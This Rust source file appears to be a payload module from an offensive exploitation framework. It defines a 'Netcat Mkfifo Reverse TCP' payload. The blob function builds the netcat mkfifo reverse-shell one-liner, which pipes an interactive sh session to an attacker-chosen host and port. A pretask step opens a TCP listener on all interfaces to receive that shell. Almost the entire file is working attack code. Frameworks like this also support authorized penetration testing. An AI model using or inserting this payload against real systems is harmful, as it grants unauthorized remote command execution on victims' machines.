use crate::core::{
    handler::generic_tcp_handler::GenericTcpHandler,
    opt::Opt,
    payload::reverse,
    payload::{reverse::Reverse, Info, Payload},
};
use log::info;
use std::error::Error;

#[derive(Clone)]
pub struct NcMkfifoReverseTcp {
    pub reverse: Reverse,
}

impl Payload for NcMkfifoReverseTcp {
    fn default() -> Self {
        NcMkfifoReverseTcp {
            reverse: Reverse::default(),
        }
    }

    fn pretask(&self) -> Result<(), Box<dyn std::error::Error>> {
        let mut handler = GenericTcpHandler::new("0.0.0.0", &self.reverse.lport)?;
        handler.listen_for_one()?;
        Ok(())
    }

    fn blob(&self) -> Vec<u8> {
        let blob = format!(
            r#"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc {} {} >/tmp/f"#,
            self.reverse.lhost, self.reverse.lport
        );
        blob.into_bytes()
    }

    fn info(&self) -> Info {
        Info {
            descriptive_name: "Netcat Mkfifo Reverse TCP".to_string(),
            module_path: "payload/nc_mkfifo_reverse_tcp".to_string(),
            kind: self.kind().to_string(),
            description: None,
            license: None,
            author: None,
            references: None,
            platform: None,
        }
    }

    fn opts(&self) -> Vec<Opt> {
        let mut opts: Vec<Opt> = Vec::new();
        let mut reverse_opts = Reverse::opts();
        opts.append(&mut reverse_opts);
        opts
    }

    fn apply_opts(&mut self, opts: Vec<Opt>) -> Result<(), Box<dyn Error>> {
        reverse::apply_opts!(self, opts);
        Ok(())
    }
}
